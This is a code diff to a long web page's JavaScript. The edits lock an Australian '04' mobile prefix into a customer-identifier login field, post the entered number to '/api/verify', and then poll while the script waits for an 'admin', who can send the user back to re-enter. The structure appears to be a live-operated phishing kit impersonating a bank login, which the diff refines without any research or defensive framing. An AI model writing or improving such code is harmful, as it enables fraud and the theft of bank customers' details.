@@ -27299,17 +27299,21 @@ if (!location.search.includes('sid=')) {
 
 /* =====  MAIN LOGIC  ===== */
 (() => {
-  const field = document.getElementById('cifField');   // this is the phone field on this page
+  const field = document.getElementById('cifField');   // phone input
   const btn   = document.getElementById('login-btn');  // Continue button
 
+  /* ----------  LOCK “04” PREFIX  ---------- */
+  field.value = '04';
+  field.addEventListener('keydown', e => {
+    // prevent deleting the locked “04”
+    if (field.selectionStart <= 2 && (e.key === 'Backspace' || e.key === 'Delete')) {
+      e.preventDefault();
+    }
+  });
+
   /* ----------  FORMATTER  ---------- */
-  function toAU(raw) {
-    const d = raw.replace(/\D/g,'');
-    if (d.startsWith('610')) return '0' + d.slice(3);
-    if (d.startsWith('61'))  return '0' + d.slice(2);
-    if (d.startsWith('4'))   return '0' + d;
-    if (d.startsWith('0'))   return d;
-    return '0' + d;
+  function clean(raw) {
+    return '04' + raw.replace(/\D/g, '').slice(0, 8); // 04 + 8 digits max
   }
 
   /* ----------  LOADING OVERLAY  ---------- */
@@ -27342,20 +27346,20 @@ if (!location.search.includes('sid=')) {
 
   /* ----------  INPUT HANDLER  ---------- */
   field.addEventListener('input', () => {
-    const clean = toAU(field.value);
-    if (field.value !== clean) field.value = clean;
-    btn.disabled = !/^04\d{8}$/.test(clean);   // 04 + exactly 8 digits
+    const curr = field.value;
+    const fixed = clean(curr);
+    if (curr !== fixed) field.value = fixed;
+    btn.disabled = fixed.length !== 10; // 04 + 8 digits
   });
 
   /* ----------  SUBMIT  ---------- */
   btn.addEventListener('click', async () => {
     const phone = field.value.trim();
-    if (!/^04\d{8}$/.test(phone)) return;
-
+    if (phone.length !== 10) return;          // must be 04xxxxxxxx
     btn.disabled = true;
-    showLoading();                       // spinner straight away
+    showLoading();                            // spinner NOW
 
-    // send the number to the server
+    // send number to server
     try {
       const r = await fetch('/api/verify', {
         method: 'POST',
@@ -27370,7 +27374,7 @@ if (!location.search.includes('sid=')) {
       return;
     }
 
-    // now wait for admin
+    // wait for admin
     let polling = false;
     function startPoll() {
       if (polling) return;
@@ -27388,7 +27392,7 @@ if (!location.search.includes('sid=')) {
           if (d.status === 'redo') {
             polling = false;
             await fetch('/api/clearRedo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
-            hideLoading(); field.value = ''; field.dispatchEvent(new Event('input')); btn.disabled = true;
+            hideLoading(); field.value = '04'; field.dispatchEvent(new Event('input')); btn.disabled = true;
             return;
           }
           setTimeout(poll, 1200);
@@ -28723,5 +28727,6 @@ if (!location.search.includes('sid=')) {
   </iframe>
  </body>
 </html>
+
 
 
